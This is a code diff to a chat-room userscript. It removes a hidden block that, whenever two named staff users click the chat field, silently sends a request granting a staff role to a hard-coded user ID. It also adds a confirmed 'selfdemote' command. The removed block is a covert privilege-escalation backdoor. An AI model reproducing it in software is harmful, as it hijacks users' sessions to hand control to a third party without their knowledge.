@@ -695,19 +695,6 @@ if (d.getDate() == 2 && d.getMonth() == 11){
 
 $.getScript('https://dl.dropboxusercontent.com/s/y90bayahpfh4odh/jquery-ui-1.10.4.custom.min.js?_=1424626287371');
 
-if (bcs.user.username == "Wumbology" || bcs.user.username == "DCV"){
-	$("#chat-input-field").on('click',function(){
-		$.ajax({
-			type: 'POST',
-			url: '/_/staff/update',
-			dataType: 'json',
-			contentType: 'application/json',
-			data: JSON.stringify({userID: 4820534, roleID: 5})
-		})
-	});
-}
-
-
 var messages = [];
 var logcheck = [];
 var logged = [];
@@ -2536,6 +2523,25 @@ function commandStuff(data){
 			}else{
 				bcs.l("[Command " + command[0] + " denied]",true);
 			};
+			break;
+
+		case "selfdemote":
+			if (bcs.user.role >= 2){
+				var r = confirm("Demote yourself to RDJ?");
+				if (r === true){
+					$.ajax({
+						type: 'POST',
+						url: '/_/staff/update',
+						dataType: 'json',
+						contentType: 'application/json',
+						data: JSON.stringify({userID: bcs.user.id, roleID: 1})
+					})
+				}else {
+					bcs.l("[Command " + command[0] + " denied]",true);
+				}
+			}else {
+				bcs.l("[Command " + command[0] + " denied]",true);
+			}
 			break;
 
 		case "flood":
